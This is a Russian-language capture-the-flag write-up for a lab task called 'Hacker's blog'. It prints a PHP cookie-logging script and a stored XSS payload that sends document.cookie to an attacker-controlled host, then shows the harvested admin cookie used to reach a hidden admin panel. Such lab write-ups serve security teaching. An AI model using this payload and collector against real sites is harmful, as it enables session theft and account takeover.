# Hacker's blog

![Site](/img/1.png)

1. Заходим на хакерский блог, видим статьи. Переходим в любую статью и обнаруживаем комментарии.
2. Пробуем что-нибудь написать. Видим, что стоит премодерация (10 мин) - значит админ просматривает комментарии и удаляет плохие комментарии.
3. Пробуем осуществить XSS атаку. Пишем простенький код для принятия куков на своем веб-сервере:
```php
<?php
$text = urldecode($_SERVER['QUERY_STRING']);
if (!empty($_SERVER['HTTP_CLIENT_IP'])) 
{
	$ip=$_SERVER['HTTP_CLIENT_IP'];
}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
{
	$ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
}
else
{
	$ip=$_SERVER['REMOTE_ADDR'];
}
$file=fopen("file.txt", "a");
fwrite ($file, $text.PHP_EOL);
fwrite ($file, $ip.PHP_EOL);
fclose($file);
?>
```
5. Далее пишем в поле текст JS, который будет воровать куки:
```js
<script>var img=new Image();img.src="http://site.ru/xss.php?"+ encodeURI(document.cookie);</script>
```
4. Ждем 10 минут, смотрим полученные куки. `password=e0377f6e85d987d81e96c0381c789360fe90547bdf9be3b5082a492b9c4184f7; login=admin`
5. Теперь необходимо где-то применить полученные куки. Для этого ищем админку или авторизацию. На любой странице можно найти комментарий: `Secret admin panel: aHR0cDovLzEwLjAuNy4yMTY6NTQzMzcvYWRtaW42NDY0MS5waHA=`.  Раскодируем base64, получаем - http://10.0.7.216:54337/admin64641.php
6. Видим надпись: "Неверный логин или пароль! Доступ запрещен!". Используем любое расширение для назначения куков. Для Firefox - https://addons.mozilla.org/ru/firefox/addon/cookies-manager-plus/developers 
7. На странице `admin64641.php` видим флаг.
